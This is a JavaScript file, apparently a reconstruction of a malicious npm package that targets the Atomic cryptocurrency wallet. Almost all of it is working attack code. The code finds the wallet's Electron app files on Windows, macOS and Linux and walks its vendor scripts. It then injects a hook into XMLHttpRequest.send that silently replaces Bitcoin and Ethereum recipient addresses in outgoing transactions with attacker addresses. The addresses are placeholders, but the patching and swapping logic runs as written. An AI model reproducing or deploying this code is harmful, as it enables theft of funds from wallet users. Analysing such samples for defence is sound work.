// atomic-wallet-patch — reconstructed from public security analyses
// Source: https://thehackernews.com/2025/04/malicious-npm-package-targets-atomic.html
//
// Targets Atomic cryptocurrency wallet. Finds app.asar, extracts it,
// replaces vendor bundle with malicious code that swaps recipient
// crypto addresses during transactions, then repacks.
//
// Technique: Electron ASAR patching + crypto address replacement

const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");

// Attacker's crypto addresses
var ATTACKER_BTC = "bc1qfake_attacker_btc_address_for_reconstruction";
var ATTACKER_ETH = "0xFAKE_ATTACKER_ETH_ADDRESS_FOR_RECONSTRUCTION";

// Find Atomic Wallet installation
function findAtomicWallet() {
  var home = os.homedir();
  var paths = [];
  if (os.platform() === "win32") {
    paths = [
      path.join(home, "AppData", "Local", "Programs", "atomic"),
      path.join(home, "AppData", "Local", "atomic")
    ];
  } else if (os.platform() === "darwin") {
    paths = ["/Applications/Atomic Wallet.app/Contents/Resources"];
  } else {
    paths = [
      path.join(home, ".config", "atomic"),
      "/opt/atomic"
    ];
  }

  for (var i = 0; i < paths.length; i++) {
    var asarPath = path.join(paths[i], "app.asar");
    if (fs.existsSync(asarPath)) {
      return asarPath;
    }
    // Also check resources subdir
    asarPath = path.join(paths[i], "resources", "app.asar");
    if (fs.existsSync(asarPath)) {
      return asarPath;
    }
  }
  return null;
}

// Patch: Replace address in vendor JS files
function patchBundle(bundlePath) {
  try {
    var content = fs.readFileSync(bundlePath, "utf8");

    // Inject address replacement hook
    var hook = [
      "// Address replacement hook",
      "(function() {",
      "  var origSend = XMLHttpRequest.prototype.send;",
      "  XMLHttpRequest.prototype.send = function(data) {",
      "    if (typeof data === 'string' && data.includes('sendTransaction')) {",
      "      data = data.replace(/bc1[a-zA-Z0-9]{25,39}/g, '" + ATTACKER_BTC + "');",
      "      data = data.replace(/0x[a-fA-F0-9]{40}/g, '" + ATTACKER_ETH + "');",
      "    }",
      "    origSend.call(this, data);",
      "  };",
      "})();",
    ].join("\n");

    content = hook + "\n" + content;
    fs.writeFileSync(bundlePath, content);
    return true;
  } catch(e) {
    return false;
  }
}

var asarPath = findAtomicWallet();
if (asarPath) {
  // Extract, patch, repack
  var extractDir = path.join(os.tmpdir(), "atomic-patch-" + Date.now());
  try {
    // Simple extraction: read asar and find vendor bundle
    // (In reality, would use asar module to extract/repack)
    var parentDir = path.dirname(asarPath);
    var vendorFiles = [];

    // Look for unpacked vendor files
    var unpackedDir = asarPath + ".unpacked";
    if (fs.existsSync(unpackedDir)) {
      // Patch files in unpacked directory
      function walkDir(dir) {
        var entries = fs.readdirSync(dir);
        entries.forEach(function(e) {
          var fp = path.join(dir, e);
          var stat = fs.statSync(fp);
          if (stat.isFile() && e.endsWith(".js") && e.includes("vendor")) {
            patchBundle(fp);
          } else if (stat.isDirectory()) {
            walkDir(fp);
          }
        });
      }
      walkDir(unpackedDir);
    }
  } catch(e) {}
}
